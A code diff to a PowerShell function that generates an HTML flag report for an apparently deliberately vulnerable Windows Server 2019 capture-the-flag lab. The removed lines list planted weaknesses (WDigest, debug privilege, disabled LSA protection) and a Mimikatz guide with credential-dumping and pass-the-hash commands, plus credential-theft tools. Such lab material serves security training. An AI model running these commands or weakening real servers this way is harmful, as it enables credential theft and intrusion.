@@ -694,31 +694,6 @@ function Generate-FlagReport {
         <div class="pokemon-theme">
             <h1 style="color: white; border: none;">CTF Flag Report v5 - Windows Server 2019 </h1>
         </div>
-        
-        <div class="mimikatz">
-            <h3>Mimikatz-Specific Vulnerabilities:</h3>
-            <ul>
-                <li><strong>WDigest Enabled:</strong> Plaintext passwords stored in LSASS memory</li>
-                <li><strong>Debug Privileges:</strong> SeDebugPrivilege granted to non-admin users</li>
-                <li><strong>Pass-the-Hash Ready:</strong> NTLM authentication fully enabled</li>
-                <li><strong>LSA Protection Disabled:</strong> LSASS process not protected</li>
-                <li><strong>Credential Guard Disabled:</strong> No virtualization-based security</li>
-            </ul>
-        </div>
-        
-        <div class="new-vulns">
-            <h3>v5 Features (FIXED):</h3>
-            <ul>
-                <li><strong>Fixed:</strong> AlwaysInstallElevated registry path creation</li>
-                <li><strong>Fixed:</strong> Username length limitation (FLAG format preserved)</li>
-                <li><strong>Fixed:</strong> Registry key creation for DebugFlags</li>
-                <li><strong>Fixed:</strong> Alternate Data Stream syntax</li>
-                <li><strong>Added:</strong> Mimikatz credential dumping scenarios</li>
-                <li><strong>Added:</strong> Pass-the-Hash attack vectors</li>
-                <li><strong>Added:</strong> Debug privilege abuse paths</li>
-            </ul>
-        </div>
-        
         <div class="stats">
             <h2>Statistics</h2>
             <p><strong>Total Flags:</strong> $($global:FlagList.Count)</p>
@@ -737,7 +712,6 @@ function Generate-FlagReport {
                     <th>Flag</th>
                     <th>Location</th>
                     <th>Description</th>
-                    <th>Points</th>
                     <th>Difficulty</th>
                     <th>Technique</th>
                 </tr>
@@ -753,7 +727,6 @@ function Generate-FlagReport {
                     <td class="flag-code">$($flag.Flag)</td>
                     <td>$($flag.Location)</td>
                     <td>$($flag.Description)</td>
-                    <td>$($flag.Points)</td>
                     <td class="$difficultyClass">$($flag.Difficulty)</td>
                     <td>$($flag.Technique)</td>
                 </tr>
@@ -763,35 +736,6 @@ function Generate-FlagReport {
     $html += @"
             </tbody>
         </table>
-        
-        <h2>Mimikatz Attack Guide</h2>
-        <h3>Credential Dumping from LSASS:</h3>
-        <pre>
-mimikatz # privilege::debug
-mimikatz # sekurlsa::logonpasswords
-mimikatz # sekurlsa::wdigest
-mimikatz # sekurlsa::tickets
-        </pre>
-        
-        <h3>Pass-the-Hash Attack:</h3>
-        <pre>
-mimikatz # sekurlsa::pth /user:Administrator /ntlm:HASH /domain:. /run:cmd.exe
-        </pre>
-        
-        <h3>Debug Privilege Abuse:</h3>
-        <pre>
-mimikatz # privilege::debug
-mimikatz # token::elevate
-mimikatz # lsadump::sam
-        </pre>
-        
-        <h2>Recommended Tools</h2>
-        <ul>
-            <li><strong>Mimikatz:</strong> Full version for credential extraction</li>
-            <li><strong>Invoke-Mimikatz:</strong> PowerShell version for memory attacks</li>
-            <li><strong>ProcDump:</strong> Dump LSASS for offline analysis</li>
-            <li><strong>WCE:</strong> Windows Credentials Editor alternative</li>
-        </ul>
     </div>
 </body>
 </html>
